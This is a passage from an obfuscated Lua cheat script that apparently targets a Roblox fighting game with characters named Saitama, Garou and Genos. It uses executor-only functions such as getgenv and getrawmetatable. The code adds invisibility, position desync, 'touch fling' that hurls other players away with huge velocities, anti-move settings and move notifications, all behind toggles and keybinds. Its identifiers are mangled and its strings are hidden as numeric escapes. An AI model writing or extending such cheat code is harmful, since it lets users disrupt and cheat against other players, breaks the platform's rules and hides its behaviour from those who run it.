 task.spawn( function () local _IIlIIllIIl = tick() repeat RunService.RenderStepped:Wait() until _IIIIIlIlll:GetAttribute("\080\114\101\108\111\097\100\068\111\110\101") or tick() >= _IIlIIllIIl + 0x1E if _IIIIIlIlll and _IIIIIlIlll.Parent then if _IIIIIlIlll.Character then task.spawn(_IlIIIIIIlI, _IIIIIlIlll, _IIIIIlIlll.Character) end
 local _IIIlIlllll = _IIIIIlIlll.CharacterAdded:Connect( function (_IIllllIlII) task.spawn(_IlIIIIIIlI, _IIIIIlIlll, _IIllllIlII) end
 ) _llIllIIlIl[_IIIIIlIlll] = _IIIlIlllll end
 end
 ) end
 ) local _llllllllII = Players.PlayerRemoving:Connect( function (_IIIIIlIlll) if _IlIlllIlII[_IIIIIlIlll] then pcall( function () _IlIlllIlII[_IIIIIlIlll]:Disconnect() end
 ) _IlIlllIlII[_IIIIIlIlll] = nil end
 if _llIllIIlIl[_IIIIIlIlll] then pcall( function () _llIllIIlIl[_IIIIIlIlll]:Disconnect() end
 ) _llIllIIlIl[_IIIIIlIlll] = nil end
 end
 ) table.insert(_llIlllIlIl, function () pcall( function () _IIlllIIlll:Disconnect() end
 ) for _lllIlllIIl, _IIIlIlllll in pairs(_IlIlllIlII) do pcall(_IIIlIlllll.Disconnect, _IIIlIlllll) end
 for _lllIlllIIl, _IIIlIlllll in pairs(_llIllIIlIl) do pcall(_IIIlIlllll.Disconnect, _IIIlIlllll) end
 _IlIlllIlII = {} _llIllIIlIl = {} getgenv().desync = nil pcall( function () _IIlIlIIlIl.AntiMoves_Trashcan:SetValue(false) end
 ) pcall( function () _IlIllIIllI.AntiMoves_Saitama:SetValue({}) end
 ) pcall( function () _IlIllIIllI.AntiMoves_Garou:SetValue({}) end
 ) pcall( function () _IlIllIIllI.AntiMoves_Genos:SetValue({}) end
 ) pcall( function () _IlIllIIllI.AntiMoves_Tatsumaki:SetValue({}) end
 ) pcall( function () _IlIllIIllI.AntiMoves_AtomicSamurai:SetValue({}) end
 ) pcall( function () _IlIllIIllI.AntiMoves_Suiryu:SetValue({}) end
 ) pcall( function () _IlIllIIllI.AntiMoves_MetalBat:SetValue({}) end
 ) pcall( function () _IlIllIIllI.AntiMoves_Sonic:SetValue({}) end
 ) pcall( function () _IlIllIIllI.AntiMoves_KJ:SetValue({}) end
 ) pcall( function () _IlIllIIllI.AntiMoves_FrozenSoul:SetValue({}) end
 ) pcall( function () _IIlIlIIlIl.ShowDeathCounter:SetValue(false) end
 ) end
 ) task.spawn( function () local _IIIlIlllll = nil task.spawn( function () repeat task.wait() until _llIIIlIIll.Character local _IlIIIllllI = _llIIIlIIll.Character _IIIlIlllll = Instance.new("\077\111\100\101\108") _IlIIIllllI.Archivable = true local _IllIlIIlIl = _IlIIIllllI:Clone() _IlIIIllllI.Archivable = false if _IllIlIIlIl:FindFirstChildWhichIsA("\072\117\109\097\110\111\105\100") then _IllIlIIlIl.Humanoid:Destroy() end
 for _lllIlllIIl, _charpart in pairs(_IllIlIIlIl:GetChildren()) do if _charpart:IsA("\072\117\109\097\110\111\105\100") then _charpart:Destroy() elseif _charpart:IsA("\066\097\115\101\080\097\114\116") or _charpart:IsA("\077\101\115\104\080\097\114\116") then local _lIllIIIllI = _charpart:Clone() _lIllIIIllI.CanCollide = false _lIllIIIllI.Anchored = true _lIllIIIllI.Transparency = not table.find({ "\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116", "\070\097\107\101\072\101\097\100", "\072\105\116\098\111\120\095\082\105\103\104\116\065\114\109", "\072\105\116\098\111\120\095\076\101\102\116\065\114\109", "\072\105\116\098\111\120\095\082\105\103\104\116\076\101\103", "\072\105\116\098\111\120\095\076\101\102\116\076\101\103", }, _lIllIIIllI.Name) and 0.65 or 0x1 _lIllIIIllI.Color = Color3.fromRGB(0xFF, 0xFF, 0xFF) _lIllIIIllI.Size = _lIllIIIllI.Size * 1.01 _lIllIIIllI.Parent = _IIIlIlllll if _lIllIIIllI.Name ~= "\072\101\097\100" then if _lIllIIIllI.Name ~= "\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116" then _lIllIIIllI.Material = Enum.Material.ForceField local _lIlIIIlIll = Instance.new("\083\112\101\099\105\097\108\077\101\115\104", _lIllIIIllI) _lIlIIIlIll.Scale = _lIllIIIllI.Size _lIlIIIlIll.TextureId = "\114\098\120\097\115\115\101\116\105\100\058\047\047\053\049\048\049\057\050\051\054\048\055" _lIlIIIlIll.VertexColor = Vector3.new(0xFF, 0x0, 0x0) end
 else _lIllIIIllI.Color = Color3.fromRGB(0xFF, 0x0, 0x0) end
 for _lllIlllIIl, _trash_part in pairs({ "\083\111\117\110\100", "\068\101\099\097\108", "\084\114\097\105\108", "\066\111\100\121\086\101\108\111\099\105\116\121", "\066\111\100\121\071\121\114\111", "\066\111\100\121\080\111\115\105\116\105\111\110", "\080\097\114\116\105\099\108\101\069\109\105\116\116\101\114", }) do local _llIllIlIII = _lIllIIIllI:FindFirstChildWhichIsA(_trash_part) if _llIllIlIII then _llIllIlIII:Destroy() end
 end
 end
 end
 _IIIlIlllll.Parent = workspace.Terrain getgenv()._vizClone = _IIIlIlllll end
 ) RunService.Heartbeat:Connect( function () if _IllIIlIIll.Unloaded then return end
 if not _IIIlIlllll then return end
 local _lIIIIIlIII = _llIIIlIIll.Character if not _lIIIIIlIII then return end
 local _lIIIlIlIII = _lIIIIIlIII:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") local _llIIIllIlI = _lIIIIIlIII:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if not (_lIIIlIlIII and _llIIIllIlI) then return end
 local _lllllIIIII = nil local _lIlIllllll = false if _IlIIlIllIl.Invisibility or _IlIIlIllIl["\068\111\105\110\103\032\087\097\108\108\032\067\111\109\098\111\032\065\110\121\119\104\101\114\101"] then _lIlIllllll = ( not getgenv().desync or _lIIIIIlIII:FindFirstChild("\065\098\115\111\108\117\116\101\073\109\109\111\114\116\097\108")) and true or _lIlIllllll end
 if _llIIIllIlI.Health > 0x0 then if _IlIIlIllIl.Invisibility or _IlIIlIllIl["\085\112\115\105\100\101\032\068\111\119\110"] then _lllllIIIII = _lIIIlIlIII.CFrame * CFrame.Angles(0x0, 0x0, math.rad(0xB4)) end
 if getgenv().flingDesync then _lllllIIIII = getgenv().flingDesync.CFrame or _lllllIIIII end
 if getgenv().desync and not _lIIIIIlIII:FindFirstChild("\065\098\115\111\108\117\116\101\073\109\109\111\114\116\097\108") then _lllllIIIII = getgenv().desync.CFrame or _lllllIIIII end
 end
 if _lIlIllllll and _IIlIlIIlIl.Visualizer and _IIlIlIIlIl.Visualizer.Value then for _lllIlllIIl, v1390 in pairs(_IIIlIlllll:GetChildren()) do if v1390:IsA("\066\097\115\101\080\097\114\116") then local _lIIlIIIIlI = _lIIIIIlIII:FindFirstChild(v1390.Name) if _lIIlIIIIlI and _lIIlIIIIlI:IsA("\066\097\115\101\080\097\114\116") then v1390.CFrame = _lIIlIIIIlI.CFrame end
 end
 end
 end
 if _lllllIIIII then if _IIlIlIIlIl.Visualizer and _IIlIlIIlIl.Visualizer.Value and not (_IIlIlIIlIl.AlwaysVisualize and _IIlIlIIlIl.AlwaysVisualize.Value) and not _lIlIllllll then for _lllIlllIIl, v1396 in pairs(_IIIlIlllll:GetChildren()) do if v1396:IsA("\066\097\115\101\080\097\114\116") then local _lIlIlllIll = _lIIIIIlIII:FindFirstChild(v1396.Name) if _lIlIlllIll and _lIlIlllIll:IsA("\066\097\115\101\080\097\114\116") then v1396.CFrame = _lIlIlllIll.CFrame end
 end
 end
 end
 end
 if not _lIlIllllll then if _IIlIlIIlIl.Visualizer and _IIlIlIIlIl.Visualizer.Value and _IIlIlIIlIl.AlwaysVisualize and _IIlIlIIlIl.AlwaysVisualize.Value then for _lllIlllIIl, v1402 in pairs(_IIIlIlllll:GetChildren()) do if v1402:IsA("\066\097\115\101\080\097\114\116") then local _IlIlllIIlI = _lIIIIIlIII:FindFirstChild(v1402.Name) if _IlIlllIIlI and _IlIlllIIlI:IsA("\066\097\115\101\080\097\114\116") then v1402.CFrame = _IlIlllIIlI.CFrame end
 end
 end
 elseif not (_IIlIlIIlIl.Visualizer and _IIlIlIIlIl.Visualizer.Value and (_IIlIlIIlIl.AlwaysVisualize and _IIlIlIIlIl.AlwaysVisualize.Value or _lllllIIIII)) then for _lllIlllIIl, v1408 in pairs(_IIIlIlllll:GetChildren()) do if v1408:IsA("\066\097\115\101\080\097\114\116") then v1408.CFrame = CFrame.new(0x0, 0xF4240, 0x0) end
 end
 end
 end
 end
 ) end
 ) task.spawn( function () local function _lIIIIIlIII(_IIllllIlII) repeat task.wait() until (_llIIIlIIll.Character == _IIllllIlII) and _IIllllIlII:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") and _IIllllIlII:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _llIIIlIIll.Character ~= _IIllllIlII then return end
 local _llIIlIIlII = _IIllllIlII:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") task.spawn( function () while task.wait() and ( not _llIIIlIIll.Character or _llIIIlIIll.Character == _IIllllIlII) do if getgenv().desync and not _IIllllIlII:FindFirstChild("\065\098\115\111\108\117\116\101\073\109\109\111\114\116\097\108") then local _lIlIlIIIII = {} local _lIIIIIllII, afterimage = pcall( function () return _IIllllIlll.Resources.NinjaUlt.Afterimage_Despawn:Clone() end
 ) local _IIIlllIIII, tpthing = pcall( function () return _IIllllIlll.Resources.VanishingKick.tpthing:Clone() end
 ) if _lIIIIIllII and afterimage then afterimage.Parent = _llIIlIIlII _lIlIlIIIII[0x1] = afterimage for _lllIlllIIl, pe in pairs(afterimage:GetChildren()) do if pe:IsA("\080\097\114\116\105\099\108\101\069\109\105\116\116\101\114") then pe.Enabled = true pe.Rate = 0x64 end
 end
 end
 if _IIIlllIIII and tpthing then tpthing.Parent = _llIIlIIlII _lIlIlIIIII[0x2] = tpthing tpthing.Enabled = true tpthing.Rate = 0x64 end
 repeat if _lIlIlIIIII[0x1] and _lIlIlIIIII[0x1].Parent then _lIlIlIIIII[0x1].CFrame = _llIIlIIlII.CFrame end
 RunService.RenderStepped:Wait() until not getgenv().desync or _IIllllIlII:FindFirstChild("\065\098\115\111\108\117\116\101\073\109\109\111\114\116\097\108") for _lllIlllIIl, _lIIIIIIIII in pairs(_lIlIlIIIII) do pcall( function () _lIIIIIIIII:Destroy() end
 ) end
 end
 end
 end
 ) task.spawn( function () for _lllIlllIIl, _llIIIIlllI in pairs(_IIllllIlII:GetDescendants()) do if _llIIIIlllI:IsA("\066\097\115\101\080\097\114\116") and _llIIIIlllI ~= _llIIlIIlII and _llIIIIlllI.Transparency ~= 0x1 and not _llIIIIlllI.Name:lower():find("\104\105\116\098\111\120") then task.spawn( function () while task.wait() and ( not _llIIIlIIll.Character or _llIIIlIIll.Character == _IIllllIlII) do if _llIIIIlllI and (_IlIIlIllIl.Invisibility or (getgenv().desync and not _IIllllIlII:FindFirstChild("\065\098\115\111\108\117\116\101\073\109\109\111\114\116\097\108"))) then _llIIIIlllI.Transparency = 0.5 repeat RunService.RenderStepped:Wait() until not _IlIIlIllIl.Invisibility and ( not getgenv().desync or _IIllllIlII:FindFirstChild("\065\098\115\111\108\117\116\101\073\109\109\111\114\116\097\108")) or (_llIIIlIIll.Character and _llIIIlIIll.Character ~= _IIllllIlII) _llIIIIlllI.Transparency = 0x0 end
 end
 end
 ) end
 end
 end
 ) end
 if _llIIIlIIll.Character then task.spawn(_lIIIIIlIII, _llIIIlIIll.Character) end
 _llIIIlIIll.CharacterAdded:Connect( function (_IIllllIlII) task.spawn(_lIIIIIlIII, _IIllllIlII) end
 ) end
 ) _lllllIIlIl:AddToggle("\083\104\111\119\068\101\097\116\104\067\111\117\110\116\101\114", { Text = "\083\104\111\119\032\068\101\097\116\104\032\067\111\117\110\116\101\114", Default = false, Callback = function (_lIllIlIIll) _lIIIllllII = _lIllIlIIll _IllIlIlIll() if _lIllIlIIll then for _lllIlllIIl, co in pairs(_lIIIIIlIlI) do pcall(co.Disconnect, co) end
 _lIIIIIlIlI = {} _IllIIllIIl = {} _lIllIlllll = {} _lIllIIlIll = {} for _lllIlllIIl, _IIIIIlIlll in pairs(Players:GetPlayers()) do _lIllIIIlIl(_IIIIIlIlll) end
 table.insert(_lIIIIIlIlI, Players.PlayerAdded:Connect( function (_IIIIIlIlll) if _lIIIllllII then _lIllIIIlIl(_IIIIIlIlll) end
 end
 )) table.insert(_lIIIIIlIlI, Players.PlayerRemoving:Connect( function (_IIIIIlIlll) _lIIllIlllI(_IIIIIlIlll) end
 )) else for _lllIlllIIl, co in pairs(_lIIIIIlIlI) do pcall(co.Disconnect, co) end
 _lIIIIIlIlI = {} _IllIIllIIl = {} _lIllIlllll = {} _lIllIIlIll = {} end
 end
 }) _lllllIIlIl:AddToggle("\077\111\118\101\078\111\116\105\102\105\099\097\116\105\111\110\115", { Text = "\077\111\118\101\032\078\111\116\105\102\105\099\097\116\105\111\110\115", Default = false, }) _lllllIIlIl:AddToggle("\069\120\112\111\115\101\077\111\118\101\073\110\067\104\097\116", { Text = "\069\120\112\111\115\101\032\109\111\118\101\115\032\105\110\032\099\104\097\116", Default = false, }) _lllllIIlIl:AddToggle("\069\120\112\111\115\101\087\104\105\116\101\108\105\115\116\101\100\080\108\097\121\101\114\115", { Text = "\069\120\112\111\115\101\032\087\104\105\116\101\108\105\115\116\101\100\032\080\108\097\121\101\114\115", Default = false, }) _lllllIIlIl:AddDropdown("\077\111\118\101\078\111\116\105\102\105\099\097\116\105\111\110\077\111\118\101\115", { Values = { "\068\101\097\116\104\032\067\111\117\110\116\101\114", "\084\097\098\108\101\032\070\108\105\112", "\083\101\114\105\111\117\115\032\080\117\110\099\104", "\079\109\110\105\045\068\105\114\101\099\116\105\111\110\097\108\032\080\117\110\099\104", "\068\101\097\116\104\032\066\108\111\119", "\076\097\115\116\032\066\114\101\097\116\104", }, Default = {}, Multi = true, Searchable = false, Text = "\077\111\118\101\115", }) end
 _IlIIlIllIl = { Flying = false, ["\084\111\117\099\104\032\070\108\105\110\103"] = false, ["\084\111\117\099\104\032\070\108\105\110\103\032\083\101\116\116\105\110\103\115"] = Vector3.new(0x0, 0x0, 0x0), ["\084\114\097\115\104\099\097\110\032\076\097\117\110\099\104"] = false, } _lIllIlllll = { Fly = false, ["\076\111\099\107\045\111\110"] = false, ["\084\111\117\099\104\032\070\108\105\110\103"]= false, } do local _IIlIlllIIl = false local _IIlIIlllII = false local _lIlllIllIl = nil local _IIIIIlIlII = nil local _IIllIIlIIl = nil local _lIlIlIIllI = {} local _lllIIIIIII = Instance.new("\077\111\100\101\108", workspace) local _lIlIIIIIlI = Instance.new("\072\117\109\097\110\111\105\100", _lllIIIIIII) local _lIllIllIll = Instance.new("\080\097\114\116", _lllIIIIIII) _lIllIllIll.Name = "\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116" _lIllIllIll.CanCollide = false _lIllIllIll.Transparency = 0x1 _lIllIllIll.Anchored = true _lIllIllIll.Size = Vector3.new(0x2, 0x2, 0x1) getgenv().InvisHumanoid = _lIlIIIIIlI getgenv().InvisPart30 = _lIllIllIll local _llllIllIlI = RunService.Heartbeat:Connect( function () if _IllIIlIIll.Unloaded then return end
 local _lllIIlIIII = getgenv().flingDesync ~= nil local _llIIlIIIlI = getgenv().desync ~= nil if not _IIlIlllIIl and not _lllIIlIIII and not _llIIlIIIlI and not _IlIIlIllIl["\084\111\117\099\104\032\070\108\105\110\103"] and not _IlIIlIllIl["\084\114\097\115\104\099\097\110\032\076\097\117\110\099\104"] and not _IlIIlIllIl["\085\112\115\105\100\101\032\068\111\119\110"] then return end
 if getgenv().TrashcanIsRunning then local _IIIlIlllll = _llIIIlIIll.Character local _IlIIIIIIll = _IIIlIlllll and _IIIlIlllll:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if _IlIIIIIIll then _lIllIllIll.CFrame = _IlIIIIIIll.CFrame end
 return end
 if _IIlIIlllII then return end
 _IIlIIlllII = true local _IllIIIlIlI = _llIIIlIIll.Character local _IIIlIIIlII = _IllIIIlIlI and _IllIIIlIlI:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") local _IlIlIIlIll = _IllIIIlIlI and _IllIIIlIlI:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if not _IllIIIlIlI or not _IIIlIIIlII or not _IlIlIIlIll then _IIlIIlllII = false return end
 if _IIIlIIIlII.Health <= 0x0 then if _IIlIlllIIl then task.spawn(_lIllIIllIl) end
 _IIlIIlllII = false return end
 local _IlIIIIIlII = _IlIlIIlIll.CFrame local _llllllllIl = _IlIlIIlIll.Velocity _IIllIIlIIl = _IlIIIIIlII local _llIlIIIlll = workspace.CurrentCamera local _IIIllllllI = nil if _IlIIlIllIl["\085\112\115\105\100\101\032\068\111\119\110"] then _IIIllllllI = _IlIIIIIlII * CFrame.Angles(0x0, 0x0, math.rad(0xB4)) elseif _IIlIlllIIl then _IIIllllllI = _IlIIIIIlII end
 if _llIIlIIIlI and not _llIIIlIIll.Character:FindFirstChild("\065\098\115\111\108\117\116\101\073\109\109\111\114\116\097\108") then _IIIllllllI = getgenv().desync.CFrame or _IIIllllllI end
 if _lllIIlIIII then _IIIllllllI = getgenv().flingDesync.CFrame or _IIIllllllI end
 local _lIIIlIIIlI = false if _IIIllllllI then if _llIlIIIlll and not (_IIlIlllIIl and not _llIIlIIIlI and not _lllIIlIIII) then _IllIIIlIlI:SetAttribute("\078\111\072\101\097\100\076\101\114\112", true) _llIlIIIlll.CameraSubject = _lIlIIIIIlI _lIIIlIIIlI = true end
 _lIllIllIll.CFrame = _IlIIIIIlII if not _IlIIlIllIl.Flying then _IlIlIIlIll.CFrame = _IIIllllllI end
 end
 local _lIlIIlIlIl = nil local _lllIIIIIII = nil if _IIlIlllIIl and not (_lllIIlIIII and getgenv().flingDesync.Velocity) then if _IIIIIlIlII ~= _IIIlIIIlII then if _lIlllIllIl then pcall( function () if _lIlllIllIl.IsPlaying then _lIlllIllIl:Stop() end
 end
 ) _lIlllIllIl = nil end
 _IIIIIlIlII = _IIIlIIIlII end
 local _IIIIlIIllI = _IIIlIIIlII:FindFirstChildOfClass("\065\110\105\109\097\116\111\114") if _IIIIlIIllI then if not _lIlllIllIl or _lIlllIllIl.Parent == nil then local _llllIlIllI = Instance.new("\065\110\105\109\097\116\105\111\110") _llllIlIllI.AnimationId = "\114\098\120\097\115\115\101\116\105\100\058\047\047\055\049\049\056\049\048\049\053\052\052\051\048\051\048" _lIlllIllIl = _IIIIlIIllI:LoadAnimation(_llllIlIllI) _lIlllIllIl.Priority = Enum.AnimationPriority.Action4 end
 _lIlIIlIlIl = _lIlllIllIl _lIlIIlIlIl:Play() _lIlIIlIlIl.TimePosition = 13.45 _lIlIIlIlIl:AdjustSpeed(0x0) _lIlIIlIlIl:AdjustWeight(2e9) end
 end
 if _IIlIlllIIl and getgenv().MechInvisHandled then local _lIllIlIlII = getgenv()._mechInvisTrack if _lIllIlIlII then pcall( function () if not _lIllIlIlII.IsPlaying then _lIllIlIlII:Play() end
 _lIllIlIlII.TimePosition = 0.01 _lIllIlIlII:AdjustSpeed(0x0) _lIllIlIlII:AdjustWeight(2e9) end
 ) _lllIIIIIII = _lIllIlIlII end
 end
 if _IlIIlIllIl["\084\114\097\115\104\099\097\110\032\076\097\117\110\099\104"] and _IIlIlIIlIl.TrashcanLaunch and _IIlIlIIlIl.TrashcanLaunch.Value then _IlIlIIlIll.AssemblyLinearVelocity = _IlIlIIlIll.CFrame.LookVector * _IlIllIIllI.Trashcan_LaunchPower.Value elseif getgenv().flingDesync and getgenv().flingDesync.Velocity then _IlIlIIlIll.Velocity = Vector3.new(-0x71AFD498D0000, -0x71AFD498D0000, -0x71AFD498D0000) elseif _IlIIlIllIl["\084\111\117\099\104\032\070\108\105\110\103"] then if _IlIllIIllI.TouchFlingMethod and _IlIllIIllI.TouchFlingMethod.Value == "\078\111\114\109\097\108" then local _IlllIlllll = _IlIIlIllIl["\084\111\117\099\104\032\070\108\105\110\103\032\083\101\116\116\105\110\103\115"] if _IlllIlllll.Magnitude <= 0x2^0x1E then pcall( function () _IlIlIIlIll.Velocity = _IlllIlllll end
 ) pcall( function () _IlIlIIlIll.RotVelocity = Vector3.zero end
 ) else _IlIlIIlIll.AssemblyLinearVelocity = _IlllIlllll _IlIlIIlIll.AssemblyAngularVelocity = Vector3.zero end
 elseif _IlIllIIllI.TouchFlingMethod and _IlIllIIllI.TouchFlingMethod.Value == "\068\101\097\116\104" then local _lllIllllIl = false end
 end
 RunService.RenderStepped:Wait() _lIlIIIIIlI.CameraOffset = _IIIlIIIlII.CameraOffset if _llIlIIIlll and _llIlIIIlll.CameraSubject == _lIlIIIIIlI then _IllIIIlIlI:SetAttribute("\078\111\072\101\097\100\076\101\114\112", false) _llIlIIIlll.CameraSubject = _IIIlIIIlII end
 if _lIlIIlIlIl and _lIlIIlIlIl.IsPlaying then pcall( function () _lIlIIlIlIl:Stop() end
 ) end
 if _lllIIIIIII and _lllIIIIIII.IsPlaying then pcall( function () _lllIIIIIII:Stop() end
 ) end
 if _IIIllllllI and not _IlIIlIllIl.Flying then if _llIlIIIlll and _lIlIIlIlII.MouseBehavior == Enum.MouseBehavior.LockCenter and not _llIIlIIIlI and not (_IIlIlllIIl and not _llIIlIIIlI and not _lllIIlIIII) then local _IlllIIIllI = _llIlIIIlll.CFrame.LookVector local _IllIlllIIl = Vector3.new(_IlllIIIllI.X, 0x0, _IlllIIIllI.Z) if _IllIlllIIl.Magnitude > 0.001 then _IlIlIIlIll.CFrame = CFrame.new(_IlIIIIIlII.Position, _IlIIIIIlII.Position + _IllIlllIIl) else _IlIlIIlIll.CFrame = _IlIIIIIlII end
 else _IlIlIIlIll.CFrame = _IlIIIIIlII end
 end
 if not _IlIIlIllIl.Flying then _IlIlIIlIll.Velocity = _llllllllIl end
 _IIlIIlllII = false end
 ) local function _llIlllIlII() if not _IIlIlllIIl then return end
 _IIlIlllIIl = false getgenv().InvisActive = false _IIlIIlllII = false if _lIlllIllIl then pcall( function () if _lIlllIllIl.IsPlaying then _lIlllIllIl:Stop() end
 end
 ) _lIlllIllIl = nil end
 _IIIIIlIlII = nil local _IIllllIlII = _llIIIlIIll.Character if _IIllllIlII then local _llIIlIIlII = _IIllllIlII:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if _llIIlIIlII and _IIllIIlIIl then pcall( function () _llIIlIIlII.CFrame = _IIllIIlIIl end
 ) end
 _IIllIIlIIl = nil local _IlIIlIIlIl = _IIllllIlII:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _IlIIlIIlIl then pcall( function () workspace.CurrentCamera.CameraSubject = _IlIIlIIlIl end
 ) end
 pcall( function () _IIllllIlII:SetAttribute("\078\111\072\101\097\100\076\101\114\112", false) end
 ) for _lllIlllIIl, _ic in pairs(_lIlIlIIllI) do pcall( function () _ic:Disconnect() end
 ) end
 _lIlIlIIllI = {} for _lllIlllIIl, _llIIIIlllI in pairs(_IIllllIlII:GetDescendants()) do if _llIIIIlllI:IsA("\066\097\115\101\080\097\114\116") and _llIIIIlllI.Name ~= "\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116" then _llIIIIlllI.LocalTransparencyModifier = 0x0 end
 end
 end
 if not getgenv().TrashcanIsRunning then _llIlIllIlI(true) end
 if getgenv()._invisSavedTPose then _llllIIlIlI() end
 getgenv()._invisSavedTPose = nil end
 table.insert(_llIlllIlIl, function () _llIlllIlII() pcall( function () _IIlIlIIlIl.TogInvis:SetValue(false) end
 ) end
 ) getgenv().stopInvisibilityFn = _llIlllIlII local function _lIllIIllIl() if _lIlllIllIl then pcall( function () if _lIlllIllIl.IsPlaying then _lIlllIllIl:Stop() end
 end
 ) _lIlllIllIl = nil end
 _IIIIIlIlII = nil _IIllIIlIIl = nil _IIlIIlllII = false end
 local function _lIllIlllIl(_llIIIIlllI) if not _llIIIIlllI:IsA("\066\097\115\101\080\097\114\116") then return end
 if _llIIIIlllI.Name == "\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116" then return end
 if _llIIIIlllI.Transparency == 0x1 then return end
 if _llIIIIlllI.Name:lower():find("\104\105\116\098\111\120") then return end
 _llIIIIlllI.LocalTransparencyModifier = 0.5 local _IllIIIllII = _llIIIIlllI:GetPropertyChangedSignal("\076\111\099\097\108\084\114\097\110\115\112\097\114\101\110\099\121\077\111\100\105\102\105\101\114"):Connect( function () if not _IIlIlllIIl then return end
 if _llIIIIlllI.LocalTransparencyModifier ~= 0.5 then _llIIIIlllI.LocalTransparencyModifier = 0.5 end
 end
 ) table.insert(_lIlIlIIllI, _IllIIIllII) end
 local function _IlIllllIIl(_IIIlIlllll) for _lllIlllIIl, _llIIIIlllI in pairs(_IIIlIlllll:GetDescendants()) do _lIllIlllIl(_llIIIIlllI) end
 local _lllIlIlIII = _IIIlIlllll.DescendantAdded:Connect( function (desc) if _IIlIlllIIl then _lIllIlllIl(desc) end
 end
 ) table.insert(_lIlIlIIllI, _lllIlIlIII) end
 local function _IIIlllIIlI() if _IIlIlllIIl then _llIlllIlII() return end
 local _IIllllIlII = _llIIIlIIll.Character if not _IIllllIlII then return end
 local _IlIIlIIlIl = _IIllllIlII:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") local _llIIlIIlII = _IIllllIlII:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if not _IlIIlIIlIl or not _llIIlIIlII then return end
 getgenv()._invisSavedTPose = _lIllIIIIlI or false _IIlIlllIIl = true getgenv().InvisActive = true _IIlIIlllII = false local _IIIlIlllll = _llIIIlIIll.Character if _IIIlIlllll then _IlIllllIIl(_IIIlIlllll) end
 end
 local _lIllIIIIII = _lIlllIlllI:AddToggle("\084\111\103\073\110\118\105\115", { Text = "\073\110\118\105\115\105\098\105\108\105\116\121", Default = false, Callback = function (_lIllIlIIll) if not _lIllIlIIll then if _IlIllIIllI.KPInvis then _IlIllIIllI.KPInvis.Toggled = false end
 if _IIlIlllIIl then _llIlllIlII() end
 end
 end
 , }) _lIllIIIIII:AddKeyPicker("\075\080\073\110\118\105\115", { Default = "\085", Text = "\073\110\118\105\115\105\098\105\108\105\116\121", SyncToggleState = false, Mode = "\084\111\103\103\108\101", Callback = function () if _IllllIllll.IV then return end
 if not _IIlIlIIlIl.TogInvis.Value then _IlIllIIllI.KPInvis.Toggled = false return end
 if _lIIlIIlIll() then return end
 _IIIlllIIlI() end
 , }) _lIllIIIIII:OnChanged( function (_lIllIlIIll) if _lllIIIIllI.Invis then return end
 if _lIIlIIlIll() then _lllIIIIllI.Invis = true _lIllIIIIII:SetValue( not _lIllIlIIll) _lllIIIIllI.Invis = false return end
 if not _lIllIlIIll and _IIlIlllIIl then _llIlllIlII() end
 end
 ) task.defer( function () local _IIIllIllIl = _IlIllIIllI.KPInvis if _IIIllIllIl then local _IlllIllIIl = _IIIllIllIl.SetMode if type(_IlllIllIIl) == "\102\117\110\099\116\105\111\110" then _IIIllIllIl.SetMode = function (self, _lllIIIlIII, ...) if _lllIIIlIII == "\065\108\119\097\121\115" then _lllIIIlIII = "\084\111\103\103\108\101" end
 return _IlllIllIIl(self, _lllIIIlIII, ...) end
 end
 if _IIIllIllIl.Mode == "\065\108\119\097\121\115" then pcall( function () _IIIllIllIl:SetMode("\084\111\103\103\108\101") end
 ) end
 end
 end
 ) local _llllIlIlII = _llIIIlIIll.CharacterAdded:Connect( function (_IIllllIlII) if _IIlIlllIIl then _lIllIIllIl() for _lllIlllIIl, _ic in pairs(_lIlIlIIllI) do pcall( function () _ic:Disconnect() end
 ) end
 _lIlIlIIllI = {} task.defer( function () if not _IIlIlllIIl then return end
 local _IIIlIlllll = _llIIIlIIll.Character if _IIIlIlllll then _IlIllllIIl(_IIIlIlllll) end
 end
 ) end
 local _IlIIIlIIII = _IIllllIlII:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") or _IIllllIlII:WaitForChild("\072\117\109\097\110\111\105\100", 0x5) if _IlIIIlIIII then _IlIIIlIIII.Died:Connect( function () if _IIlIlllIIl then _lIllIIllIl() end
 end
 ) end
 end
 ) if _llIIIlIIll.Character then local _IlIIIlIIII = _llIIIlIIll.Character:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _IlIIIlIIII then _IlIIIlIIII.Died:Connect( function () if _IIlIlllIIl then _lIllIIllIl() end
 end
 ) end
 end
 end
 local _lIlIlIIIll = typeof(getrawmetatable) == "\102\117\110\099\116\105\111\110" and getrawmetatable(game) and getrawmetatable(game).__index or nil do table.insert(_llIlllIlIl, function () pcall( function () _IIlIlIIlIl.MoveNotifications:SetValue(false) end
 ) pcall( function () _IIlIlIIlIl.ExposeMoveInChat:SetValue(false) end
 ) pcall( function () _IIlIlIIlIl.ExposeWhitelistedPlayers:SetValue(false) end
 ) end
 ) end
 do function _lIIIIIIllI(_lllIIlllll) return _lllIIlllll.Character end
 function getRoot(_IIllllIlII) return _IIllllIlII and _IIllllIlII:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") or nil end
 function getHumanoid(_lllIIIIIlI) return _lllIIIIIlI and _lllIIIIIlI:FindFirstChild("\072\117\109\097\110\111\105\100") or nil end
 local _IIIlllllII = nil function patchCamera(newChild) if newChild:IsA("\067\097\109\101\114\097") then if _IIIlllllII then _IIIlllllII:Disconnect() _IIIlllllII = nil end
 if newChild.CameraType ~= Enum.CameraType.Custom and _IIlIlIIlIl.NoCameraAnimations.Value then task.spawn(fixCam) end
